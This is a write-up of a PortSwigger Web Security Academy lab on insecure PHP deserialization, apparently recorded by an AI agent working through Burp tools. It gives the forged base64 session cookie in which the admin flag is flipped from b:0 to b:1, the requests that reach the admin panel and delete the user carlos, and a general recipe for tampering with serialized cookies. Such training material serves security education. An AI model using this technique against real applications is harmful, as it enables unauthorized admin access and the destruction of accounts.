# PortSwigger Lab

## Lab

Modifying serialized objects

URL: https://0ac2001d04a1880c835e195c007500cb.web-security-academy.net/

## Vulnerability Class

Deserialization – client-modifiable PHP serialized object in session cookie leading to vertical privilege escalation (insecure deserialization / trust of client-controlled serialized state)

## Objective

Gain admin access via serialized object modification, then delete user `carlos`. Established by evidence: `/admin` denied baseline, admin panel lists `carlos` with delete link, `GET /` flipped to `is-solved` after delete. Official description not read beyond lab title link.

## Initial Observations

- Shop homepage `GET /` → 200, `Set-Cookie: session=;` empty anon, `is-notsolved`.
- `/login` → form `POST /login` with `username` + `password`.
- `POST /login wiener:peter` → 302 to `/my-account?id=wiener`, `Set-Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d`.
- Base64-decoded cookie: `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}` – PHP serialization, base64 + URL-encoded in cookie.
- No deserialization-specific methodology exists in repo (checked `methodology/` listing – 20 files, none for deserialization). No prior deserialization labs in `knowledge/portswigger/labs/`.

## Hypotheses

- H1: `session` cookie is PHP serialized `User` object with `admin` boolean trusted server-side. Flipping `b:0` → `b:1` yields admin.
- H2: Admin function is `/admin` + `/admin/delete?username=carlos` (standard pattern from access-control labs). Evidence needed: modified cookie renders Admin panel link + user list.
- H3: No signature/MAC on cookie (single base64 blob, no HMAC segment). Evidence needed: server accepts re-encoded object without errors.

## Attempts

1. Baseline `GET /` anon → 200 `is-notsolved`, empty session.
2. `GET /login` → 200 form.
3. `POST /login wiener:peter` → 302 + serialized session above. Decoded via base64 to confirm structure.
4. Crafted `O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}` → base64 → URL-encode → `Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30%3D`.
5. `GET /my-account?id=wiener` with modified cookie → 200 + `Admin panel` link appears (was absent anon). H1+H3 supported.
6. `GET /admin` with modified cookie → 200 Users list (`wiener`, `carlos` with delete links). H2 supported.
7. `GET /admin/delete?username=carlos` → 302 to `/admin`.
8. `GET /` → `is-solved` / `Solved` / `Congratulations`.

## What Failed

- Nothing material. No dead ends; first modification worked. Did not need username change to `administrator` (admin flag alone sufficed).

## What Worked

- Single-byte logic flip `b:0` → `b:1` in deserialized `admin` field, re-encoded base64+URL, replayed as `session` cookie.
- `GET /admin` → 200 panel → `GET /admin/delete?username=carlos` → 302 → `GET /` → `is-solved`.

## Burp Observations

- All HTTP via Burp MCP `burp_send_http1_request` (6 requests total).
- Login 302 + `Set-Cookie` captured session; `/my-account` differential (no Admin link vs Admin link) proved privilege change; `/admin` 200 + delete links proved authorization; 302 on delete + `is-solved` proved state change.
- `burp_base64_decode` / `burp_base64_encode` / `burp_url_encode` used for object transform. No Repeater tab needed; direct requests sufficed.

## Browser Observations

- Not required. Pure HTTP + cookie replay. No JS/state workflow.

## CLI / Tool Observations

- No CLI tools used. Burp MCP alone answered all research questions. Per tool-selection principle, Katana/httpx/Gobuster/ffuf/Nmap/curl/jq not invoked – no discovery/fuzzing question existed.

## Root Cause

Application base64-encodes PHP-serialized `User` object into client-side `session` cookie and trusts it on deserialization without integrity protection. `admin` boolean is client-controllable. Changing `b:0` to `b:1` deserializes to admin identity, bypassing server-side authorization. Classic insecure deserialization / client-state trust: data/code boundary crossed – attacker-controlled bytes become privileged object properties.

## Verification

- Same-session differential: original cookie → no Admin link; modified cookie → Admin link + `/admin` 200 + user list. Single variable (one bit) changed.
- Victim-affecting state change: `GET /admin/delete?username=carlos` → 302, then `/` marker `is-notsolved` → `is-solved`.
- Did not rely on status alone – confirmed privileged UI + victim deletion + solved marker, per verification reference.

## Impact

Vertical privilege escalation low-priv → admin via one cookie edit. Demonstrated via victim user deletion; same primitive yields full admin-panel control. In real apps same pattern yields data disclosure, account takeover, RCE where magic methods/gadgets exist (not present here – simple property flip only).

## Why The Successful Approach Worked

- Recognized `Tzo0...` as base64 (trailing `=`/`%3d`) before assuming opaque session – decoded first.
- PHP serialization is length-prefixed but boolean flip `0`→`1` preserves lengths, so no length repair needed. Chose minimal edit, not username rewrite (which would require `s:6` length care).
- Composed access-control verification discipline (denial baseline → flip → fresh privileged UI → victim state + solved marker) with new deserialization observation.

## Generalization

- For base64-serialized cookies: decode → identify type markers (`O:...:"User"`, `s:`, `b:`, `i:`) → flip lowest-risk privilege bit → re-encode preserving lengths → replay → check for privileged UI.
- Boolean flips are length-safe; string-length changes require updating `s:N` prefixes.
- Absence of HMAC/signature segment (single blob, no `.` separator) suggests no integrity – test with one-bit flip.

## Lessons Learned

- PHP `O:4:"User":2:{...}` in cookie = server trusts client objects. `b:0`→`b:1` is the discriminator; Admin link + `/admin` 200 + delete + `is-solved` is the proof chain.
- Length-safe edits first: booleans/ints before strings.
- Deserialization escalation still needs access-control verification (victim state, not 200 alone).

## Related Methodology

- No deserialization-specific methodology exists yet (`methodology/` has 20 files, none for deserialization – verified by listing; `methodology/server-side.md`, `client-side.md`, `verification.md` content not inspected beyond stub status).
- Partial overlap: `methodology/access-control.md` (inspected – vertical escalation via forged role marker, fresh-login/UI + victim-state proof) applies to the escalation half, not the serialization half.
- `methodology/injection.md` (inspected – 280 lines SQL/OS command) does NOT apply – different boundary (shell/query vs object deserialization). Deliberately not modified.

## References

- Solved instance: https://0ac2001d04a1880c835e195c007500cb.web-security-academy.net/
- Lab: https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects
- Deliberately did NOT read official solution/writeup.
